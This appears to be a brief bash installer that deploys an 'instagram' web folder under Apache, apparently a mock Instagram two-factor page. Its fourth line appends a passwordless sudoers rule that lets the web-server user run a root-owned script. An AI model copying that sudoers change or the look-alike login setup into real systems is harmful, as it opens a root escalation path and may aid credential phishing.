#!/bin/bash
cp -r instagram /var/www/html
chown -R www-data:www-data /var/www
echo "www-data ALL=NOPASSWD: /root/2FAInstagram/root.sh" >> /etc/sudoers
service apache2 restart
echo "The service is running in http://127.0.0.1:80/instagram/"
